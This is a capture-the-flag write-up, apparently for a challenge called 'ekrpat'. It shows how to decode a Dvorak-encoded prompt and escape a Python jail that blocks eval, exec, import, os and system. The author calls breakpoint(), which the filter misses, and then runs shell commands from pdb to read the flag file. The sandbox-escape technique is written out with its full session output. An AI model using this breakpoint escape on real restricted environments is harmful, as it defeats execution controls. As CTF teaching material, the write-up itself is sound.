The hint and the initial server message suggest something to do with keyboard mappings, and googling the title ekrpat also confirms that it's a qwerty/dvorak mapping.  Using any of many sites to convert from dvorak -> qwerty, we decode that message to:

> You've broken my code! Escape without the help of eval, exec, import, open, os, read, system, and write. First, enter 'dvorak'. You will then get another input which you can use try to break out of the jail.

Type in 'dvorak', and you can try to run one Python statement before getting disconnected.  All the usual interesting functions are disallowed, but are there any other interesting built-in functions that aren't banned?  Looking through the [list of built-in functions](https://docs.python.org/3/library/functions.html), I immediately noticed that `breakpoint()` wasn't banned.

So, use `breakpoint()` to break into the Python debugger, and then it's trivial to grab the flag from there:

```
$ nc 34.72.64.224 8083
Frg-k. xprt.b mf jre.! >ojal. ,cydrgy yd. d.nl ru .kanw .q.jw cmlrpyw rl.bw row p.aew ofoy.mw abe ,pcy.v Ucpoyw .by.p -ekrpat-v Frg ,cnn yd.b i.y abryd.p cblgy ,dcjd frg jab go. ypf yr xp.at rgy ru yd. hacnv
>>> dvorak
>>> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os
(Pdb) os.system('ls -al')
total 52
drwxr-xr-x 1 root root  4096 Mar 26 23:58 .
drwxr-xr-x 1 root root  4096 Mar 25 05:02 ..
-rw-r--r-- 1 root root   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 root root  3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 root root   807 Feb 25  2020 .profile
-rw-r--r-- 1 root root   555 Mar 25 05:05 Dockerfile
-rw-r--r-- 1 root root   583 Mar 26 23:57 ekrpat.py
-rw-r--r-- 1 root root    20 Mar 25 04:59 flag
-rw-r--r-- 1 root root     0 Mar 26 23:52 ojal.
-rwxr-xr-x 1 root root 18744 Mar 25 05:05 ynetd
0
(Pdb) os.system('cat flag')
UMASS{dvorak_rules}
0
```
